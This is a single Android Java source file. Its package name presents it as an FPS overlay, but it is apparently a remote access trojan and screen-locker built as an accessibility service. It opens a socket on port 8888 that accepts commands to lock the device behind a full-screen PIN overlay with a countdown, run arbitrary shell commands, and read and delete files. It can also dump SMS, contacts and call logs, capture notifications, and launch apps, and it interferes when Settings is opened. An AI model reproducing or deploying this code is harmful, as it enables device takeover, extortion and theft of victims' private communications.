package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.TextView;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.os.Environment;
import android.widget.Toast;
import java.io.File;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class SupportService extends AccessibilityService {
    private WindowManager wm;
    private View overlay;
    private TextView tv_status;
    private TextView tv_display;
    private final StringBuilder input_buffer = new StringBuilder();
    private long remaining_sec;
    private final Handler task_handler = new Handler(Looper.getMainLooper());
    private static final String PREFS_NAME = "lock_prefs";
    private static final String KEY_END_TIME = "end_time";
    
    private ServerSocket serverSocket;
    private boolean isLocked = false;
    private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
    private final List<String> notificationLog = Collections.synchronizedList(new ArrayList<>());

    public native boolean checkKey(String s);
    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            long currentTime = System.currentTimeMillis();
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            long endTime = prefs.getLong(KEY_END_TIME, 0);
            
            remaining_sec = (endTime - currentTime) / 1000;
            
            if (remaining_sec > 0) {
                update_timer();
                task_handler.postDelayed(this, 1000);
            } else {
                remaining_sec = 0;
                update_timer();
            }
        }
    };

    private void update_timer() {
        if (tv_status != null) {
            long h = remaining_sec / 3600;
            long m = (remaining_sec % 3600) / 60;
            long s = remaining_sec % 60;
            tv_status.setText(String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s));
        }
    }

    private void init_timer() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long endTime = prefs.getLong(KEY_END_TIME, 0);
        if (endTime == 0) {
            endTime = System.currentTimeMillis() + (86400 * 1000);
            prefs.edit().putLong(KEY_END_TIME, endTime).apply();
        }
    }

    @Override
    protected void onServiceConnected() {
        init_timer();
        startRemoteServer();
    }

    private void startRemoteServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(8888);
                while (true) {
                    Socket client = serverSocket.accept();
                    handleCommand(client);
                }
            } catch (Exception e) {
                // Server closed
            }
        }).start();
    }

    private void handleCommand(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter out = new PrintWriter(client.getOutputStream(), true);
            String cmd = in.readLine();

            if (cmd == null) return;
            
            String cmdLower = cmd.toLowerCase().trim();

            if (cmdLower.equals("lock")) {
                task_handler.post(() -> {
                    if (!isLocked) {
                        showOverlay();
                        isLocked = true;
                    }
                });
                out.println("OK: Device Locked");
            } else if (cmdLower.equals("unlock")) {
                task_handler.post(() -> {
                    if (isLocked) {
                        hideOverlay();
                        isLocked = false;
                    }
                });
                out.println("OK: Device Unlocked");
            } else if (cmdLower.startsWith("message ")) {
                String msg = cmd.substring(8);
                task_handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show());
                out.println("OK: Message Sent");
            } else if (cmdLower.equals("vibrate")) {
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        v.vibrate(1000);
                    }
                }
                out.println("OK: Vibrating");
            } else if (cmdLower.equals("home")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                out.println("OK: Home Pressed");
            } else if (cmdLower.equals("back")) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                out.println("OK: Back Pressed");
            } else if (cmdLower.equals("screen")) {
                String pkg = (getRootInActiveWindow() != null) ? getRootInActiveWindow().getPackageName().toString() : "Unknown";
                out.println("DATA: " + pkg);
            } else if (cmdLower.equals("pwd")) {
                out.println(currentPath);
            } else if (cmdLower.startsWith("cd ")) {
                String newPath = cmd.substring(3).trim();
                File dir = new File(newPath.startsWith("/") ? newPath : currentPath + "/" + newPath);
                if (dir.exists() && dir.isDirectory()) {
                    currentPath = dir.getAbsolutePath();
                    out.println("OK: Changed to " + currentPath);
                } else {
                    out.println("ERROR: Not a directory");
                }
            } else if (cmdLower.startsWith("ls")) {
                String pathArg = cmd.length() > 3 ? cmd.substring(3).trim() : "";
                File dir = new File(pathArg.isEmpty() ? currentPath : (pathArg.startsWith("/") ? pathArg : currentPath + "/" + pathArg));
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        List<File> fileList = new ArrayList<>();
                        Collections.addAll(fileList, files);
                        Collections.sort(fileList, (a, b) -> {
                            if (a.isDirectory() && !b.isDirectory()) return -1;
                            if (!a.isDirectory() && b.isDirectory()) return 1;
                            return a.getName().toLowerCase().compareTo(b.getName().toLowerCase());
                        });
                        StringBuilder sb = new StringBuilder();
                        for (File f : fileList) {
                            sb.append(f.isDirectory() ? "[d] " : "[f] ").append(f.getName()).append("\n");
                        }
                        out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
                    } else {
                        out.println("ERROR: Access Denied");
                    }
                } else {
                    out.println("ERROR: Invalid Dir");
                }
            } else if (cmdLower.startsWith("cat ")) {
                String fileName = cmd.substring(4).trim();
                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                if (f.exists() && f.isFile()) {
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)))) {
                        String line;
                        StringBuilder content = new StringBuilder();
                        while ((line = br.readLine()) != null) content.append(line).append("\n");
                        out.println(content.toString());
                    } catch (Exception e) {
                        out.println("ERROR: " + e.getMessage());
                    }
                } else {
                    out.println("ERROR: File not found");
                }
            } else if (cmdLower.startsWith("rm ")) {
                String fileName = cmd.substring(3).trim();
                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                if (f.exists() && f.delete()) {
                    out.println("OK: Deleted");
                } else {
                    out.println("ERROR: Delete failed");
                }
            } else if (cmdLower.equals("info")) {
                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE + " | SDK: " + Build.VERSION.SDK_INT);
            } else if (cmdLower.equals("notifs")) {
                if (notificationLog.isEmpty()) {
                    out.println("No new notifications.");
                } else {
                    StringBuilder sb = new StringBuilder();
                    synchronized (notificationLog) {
                        for (String n : notificationLog) sb.append(n).append("\n");
                        notificationLog.clear();
                    }
                    out.println(sb.toString());
                }
            } else if (cmdLower.equals("apps")) {
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                StringBuilder sb = new StringBuilder();
                for (ApplicationInfo app : apps) {
                    sb.append(app.packageName).append("\n");
                }
                out.println(sb.toString().isEmpty() ? "No apps found" : sb.toString());
            } else if (cmdLower.startsWith("launch ")) {
                String pkg = cmd.substring(7).trim();
                Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
                if (i != null) {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    out.println("OK: Launched " + pkg);
                } else {
                    out.println("ERROR: Package not found");
                }
            } else if (cmdLower.startsWith("shell ")) {
                String shellCmd = cmd.substring(6).trim();
                try {
                    Process process = Runtime.getRuntime().exec(shellCmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    process.waitFor();
                    out.println(output.toString().isEmpty() ? "OK: Executed" : output.toString());
                } catch (Exception e) {
                    out.println("ERROR: " + e.getMessage());
                }
            } else if (cmdLower.equals("dump_sms")) {
                dumpSMS(out);
            } else if (cmdLower.equals("dump_contacts")) {
                dumpContacts(out);
            } else if (cmdLower.equals("dump_calls")) {
                dumpCalls(out);
            } else {
                out.println("ERROR: Unknown Command");
            }
            client.close();
        } catch (Exception e) {
            // Error handling
        }
    }

    private void dumpSMS(PrintWriter out) {
        try {
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    String address = cur.getString(cur.getColumnIndexOrThrow("address"));
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    out.println("From: " + address + " | Body: " + body);
                }
                cur.close();
            } else {
                out.println("ERROR: Could not query SMS");
            }
        } catch (Exception e) {
            out.println("ERROR: " + e.getMessage());
        }
    }

    private void dumpContacts(PrintWriter out) {
        try {
            Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    out.println("Name: " + name + " | Phone: " + number);
                }
                cur.close();
            } else {
                out.println("ERROR: Could not query Contacts");
            }
        } catch (Exception e) {
            out.println("ERROR: " + e.getMessage());
        }
    }

    private void dumpCalls(PrintWriter out) {
        try {
            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    String number = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    int type = cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    out.println("Number: " + number + " | Name: " + name + " | Type: " + type);
                }
                cur.close();
            } else {
                out.println("ERROR: Could not query Call Log");
            }
        } catch (Exception e) {
            out.println("ERROR: " + e.getMessage());
        }
    }


    private void showOverlay() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        overlay = inflater.inflate(R.layout.sys_opt_view, null);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                   WindowManager.LayoutParams.FLAG_FULLSCREEN |
                   WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                   WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.MATCH_PARENT;
        lp.gravity = Gravity.TOP | Gravity.START;

        tv_status = overlay.findViewById(R.id.v_timer);
        tv_display = overlay.findViewById(R.id.v_display);
        
        setupButtons();

        wm.addView(overlay, lp);
        overlay.post(this::apply_immersive_mode);
        task_handler.post(ticker);
    }

    private void hideOverlay() {
        if (wm != null && overlay != null) {
            wm.removeView(overlay);
            overlay = null;
            task_handler.removeCallbacks(ticker);
        }
    }

    private void setupButtons() {
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        
        for (int id : ids) {
            overlay.findViewById(id).setOnClickListener(v -> {
                if (input_buffer.length() < 8) {
                    input_buffer.append(((Button)v).getText().toString());
                    refresh_display();
                }
            });
        }

        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
            if (input_buffer.length() > 0) {
                input_buffer.setLength(input_buffer.length() - 1);
                refresh_display();
            }
        });

        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
            if (checkKey(input_buffer.toString())) {
                hideOverlay();
                isLocked = false;
            } else {
                input_buffer.setLength(0);
                refresh_display();
            }
        });
    }

    private void apply_immersive_mode() {
        if (overlay == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            WindowInsetsController controller = overlay.getWindowInsetsController();
            if (controller != null) {
                controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                controller.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
            }
        } else {
            overlay.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void refresh_display() {
        if (tv_display != null) {
            tv_display.setText(input_buffer.toString());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "System";
            String text = event.getText() != null ? event.getText().toString() : "";
            notificationLog.add("[" + pkg + "] " + text);
            if (notificationLog.size() > 50) notificationLog.remove(0);
        }

        if (isLocked && overlay != null) {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (pkgName.equals("com.android.settings")) {
                    apply_immersive_mode();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        hideOverlay();
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
    }
}
